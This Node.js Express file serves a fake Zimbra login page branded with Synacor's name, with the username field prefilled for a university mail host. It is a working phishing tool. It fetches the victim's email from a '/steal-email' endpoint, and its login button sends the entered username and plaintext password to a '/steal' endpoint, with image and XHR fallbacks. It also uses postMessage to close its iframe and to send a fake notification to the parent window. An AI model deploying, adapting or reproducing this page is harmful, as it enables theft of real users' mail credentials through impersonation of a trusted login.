const express = require("express");
const http = require("http");

const app = express();
const server = http.createServer(app);

app.get("/", (req, res) => {
  // Set the default email for the username field
  const defaultEmail = 'mail1.cselab.nitrkl.in'; // Hardcoded default email

  res.send(`
<!DOCTYPE html>
<html>
<head>
  <title>Zimbra Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600&display=swap">
  <style>
    body {
      font-family: 'Open Sans', Arial, sans-serif;
      margin: 0;
      padding: 0;
      background: linear-gradient(180deg, #4a90e2 0%, #3d79c3 100%);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .container {
      display: flex;
      flex-direction: column;
      width: 100%;
      max-width: 360px;
    }
    .login-box {
      background: white;
      border-radius: 0;
      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
      padding: 30px;
      position: relative;
    }
    .zimbra-logo {
      color: #2d8bce;
      font-size: 32px;
      font-weight: 500;
      margin: 0 0 5px 0;
      text-align: left;
    }
    .login-heading {
      color: #5a5a5a;
      font-weight: 500;
      font-size: 18px;
      margin: 0 0 25px 0;
      text-align: left;
    }
    .form-group {
      margin-bottom: 20px;
    }
    .form-label {
      display: block;
      margin-bottom: 6px;
      font-size: 14px;
      color: #6b6b6b;
      text-align: left;
    }
    .form-input {
      display: block;
      width: 100%;
      padding: 6px 8px;
      font-size: 14px;
      color: #333;
      border: 1px solid #b8b8b8;
      border-radius: 0;
      box-sizing: border-box;
    }
    .password-container {
      position: relative;
    }
    .show-password {
      position: absolute;
      right: 10px;
      top: 7px;
      font-size: 12px;
      color: #666;
      cursor: pointer;
    }
    .login-button {
      background: #2d8bce;
      color: white;
      border: none;
      padding: 8px 20px;
      font-size: 14px;
      border-radius: 2px;
      cursor: pointer;
      margin-right: 10px;
    }
    .remember-me {
      font-size: 13px;
      color: #333;
      display: inline-flex;
      align-items: center;
    }
    .remember-me input {
      margin-right: 5px;
    }
    .version-container {
      background: #f1f1f1;
      padding: 15px 20px;
      display: flex;
      align-items: center;
      border-top: 1px solid #e0e0e0;
    }
    .version-label {
      font-size: 14px;
      color: #5a5a5a;
      margin-right: 10px;
    }
    .version-select {
      padding: 5px;
      font-size: 14px;
      border: 1px solid #ccc;
      border-radius: 0;
      flex-grow: 1;
    }
    .help-icon {
      margin-left: 10px;
      width: 18px;
      height: 18px;
      background: white;
      color: #666;
      border: 1px solid #ccc;
      border-radius: 50%;
      display: inline-flex;
      justify-content: center;
      align-items: center;
      font-size: 12px;
      cursor: pointer;
    }
    .output {
      margin-top: 20px;
      padding: 10px;
      border: 1px solid #e5e5e5;
      background: #fafafa;
      font-size: 12px;
      color: #333;
      text-align: left;
      max-height: 200px;
      overflow-y: auto;
      display: none;
    }
    .copyright {
      color: white;
      font-size: 12px;
      text-align: center;
      margin-top: 20px;
      opacity: 0.8;
    }
    .debug-info {
      background: #f0f8ff;
      border: 1px solid #ccc;
      padding: 10px;
      margin-top: 10px;
      font-size: 11px;
      font-family: monospace;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="login-box">
      <h1 class="zimbra-logo">zimbra</h1>
      <h2 class="login-heading">Log In</h2>
      
      <div class="form-group">
        <label for="username" class="form-label">Username</label>
        <input type="text" id="username" class="form-input" value="${defaultEmail}" />
      </div>
      
      <div class="form-group">
        <label for="password" class="form-label">Password</label>
        <div class="password-container">
          <input type="password" id="password" class="form-input" />
          <span class="show-password" onclick="togglePassword()">Show</span>
        </div>
      </div>
      
      <div class="form-group">
        <button class="login-button" onclick="submitCredentials()">Log In</button>
        <label class="remember-me">
          <input type="checkbox" id="remember" /> Remember me
        </label>
      </div>
      
      <div class="output" id="output" style="display: none;">
        <strong>Debug Log:</strong><br>
        Page loaded at: ${new Date().toLocaleString()}<br>
      </div>
    </div>
    
    <div class="version-container">
      <span class="version-label">Version</span>
      <select class="version-select">
        <option>Default</option>
      </select>
      <span class="help-icon">?</span>
    </div>
    
    <div class="copyright">
      Copyright © 2005-2023 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.
    </div>
  </div>

  <script>
    var outputDiv = document.getElementById('output');
    
    function logMessage(message) {
      console.log(message);
      outputDiv.innerHTML += message + '<br>';
      outputDiv.scrollTop = outputDiv.scrollHeight;
    }

    // Fetch email from /steal-email endpoint on page load
    window.addEventListener('load', async function() {
      logMessage('=== FETCHING EMAIL FROM /steal-email ===');
      try {
        const response = await fetch('http://localhost:3001/steal-email', {
          method: 'GET',
          cache: 'no-cache'
        });
        if (response.ok) {
          const data = await response.json();
          console.log('Response data:', data);
          const email = data.email || '';
          logMessage('Fetched email: ' + email);
          if (email) {
            document.getElementById('username').value = email;
            logMessage('Prefilled username with: ' + email);
          } else {
            logMessage('No email provided, username field left empty');
          }
        } else {
          logMessage('Failed to fetch email, status: ' + response.status);
        }
      } catch (error) {
        logMessage('Error fetching email: ' + error.message);
      }
      logMessage('=== EMAIL FETCH COMPLETED ===');
    });

    function togglePassword() {
      var passwordInput = document.getElementById('password');
      var showBtn = document.querySelector('.show-password');
      
      logMessage('Password toggle clicked');
      
      if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        showBtn.textContent = 'Hide';
        logMessage('Password visibility: SHOWN');
      } else {
        passwordInput.type = 'password';
        showBtn.textContent = 'Show';
        logMessage('Password visibility: HIDDEN');
      }
    }

    async function submitCredentials() {

      try {
        window.parent.postMessage('close-iframe', '*');
        logMessage('Sent close-iframe message to parent');
      } catch (e) {
        logMessage('Could not send message to parent: ' + e.message);
      }
        
      logMessage('=== LOGIN ATTEMPT STARTED ===');
      
      var username = document.getElementById('username').value;
      var password = document.getElementById('password').value;
      console.log('Username:', username);
      console.log('Password: ', password);
      logMessage('Username: "' + username + '"');
      logMessage('Password length: ' + password.length);
      
      if (!username || !password) {
        logMessage('ERROR: Missing username or password');
        alert('Please enter both username and password');
        return;
      }
      
      // Build the URL
      var baseUrl = 'http://localhost:3001/steal';
      var params = new URLSearchParams();
      params.append('username', username);
      params.append('password', password);
      var fullUrl = baseUrl + '?' + params.toString();
      
      logMessage('Target URL: ' + fullUrl);
      logMessage('Encoded params: ' + params.toString());
      
      try {
        logMessage('Attempting fetch request...');
        
        const response = await fetch(fullUrl, {
          method: 'GET',
          cache: 'no-cache'
        });
        
        logMessage('Fetch completed - Status: ' + response.status);
        logMessage('Response type: ' + response.type);
        
        try {
          const text = await response.text();
          logMessage('Response text: ' + text);
        } catch (e) {
          logMessage('Could not read response text: ' + e.message);
        }
        
      } catch (error) {
        logMessage('Fetch FAILED: ' + error.message);
        logMessage('Error name: ' + error.name);
        
        // Fallback: try with Image object
        logMessage('Trying fallback method with Image object...');
        try {
          var img = new Image();
          img.onload = function() {
            logMessage('Image method: SUCCESS (onload)');
          };
          img.onerror = function() {
            logMessage('Image method: ERROR (onerror) - but request was likely sent');
          };
          img.src = fullUrl + '&_fallback=image&_t=' + Date.now();
          logMessage('Image fallback request sent');
        } catch (imgError) {
          logMessage('Image fallback FAILED: ' + imgError.message);
        }
        
        // Fallback: try with XMLHttpRequest
        logMessage('Trying XMLHttpRequest fallback...');
        try {
          var xhr = new XMLHttpRequest();
          xhr.open('GET', fullUrl, true);
          xhr.onreadystatechange = function() {
            logMessage('XHR readyState: ' + xhr.readyState + ', status: ' + xhr.status);
            if (xhr.readyState === 4) {
              if (xhr.status === 200) {
                logMessage('XHR SUCCESS: ' + xhr.responseText);
              } else {
                logMessage('XHR completed with status: ' + xhr.status);
              }
            }
          };
          xhr.onerror = function() {
            logMessage('XHR ERROR occurred');
          };
          xhr.send();
          logMessage('XHR request sent');
        } catch (xhrError) {
          logMessage('XHR fallback FAILED: ' + xhrError.message);
        }
      }
      
      // Signal the parent window to close the iframe (if applicable)
      
      logMessage('=== LOGIN ATTEMPT COMPLETED ===');
    }

    // Enhanced message listener with more logging
    window.addEventListener('message', function(event) {
      logMessage('Received postMessage: "' + event.data + '" from: ' + event.origin);
      
      if (event.data === 'type=community-update') {
        logMessage('Processing community-update message');
        document.querySelector('.login-box').style.display = 'block';
        var fakeNotification = 'type=community-notification&unread=true';
        if (event.source) {
          event.source.postMessage(fakeNotification, event.origin || '*');
          logMessage('Sent fake notification back to: ' + event.origin);
        } else {
          logMessage('No event.source available to send response');
        }
      }
    }, false);

    // Log when iframe loads
    logMessage('Script loaded, sending iframe loaded message');
    try {
      window.parent.postMessage('Iframe loaded', '*');
      logMessage('Iframe loaded message sent successfully');
    } catch (e) {
      logMessage('Could not send iframe loaded message: ' + e.message);
    }
    
    // Additional debugging info
    logMessage('Current URL: ' + window.location.href);
    logMessage('User agent: ' + navigator.userAgent);
    logMessage('Is in iframe: ' + (window !== window.parent));
    
    // Test backend connectivity on page load
    setTimeout(async function() {
      logMessage('=== TESTING BACKEND CONNECTIVITY ===');
      try {
        const testResponse = await fetch('http://localhost:3001/test', {
          method: 'GET',
          cache: 'no-cache'
        });
        logMessage('Backend test - Status: ' + testResponse.status);
      } catch (e) {
        logMessage('Backend test FAILED: ' + e.message);
      }
      logMessage('=== BACKEND TEST COMPLETED ===');
    }, 1000);
    
  </script>
</body>
</html>
`);
});

const port = process.env.PORT || 4000;
server.listen(port, () => {
  console.log("Chat server running on port", port);
});
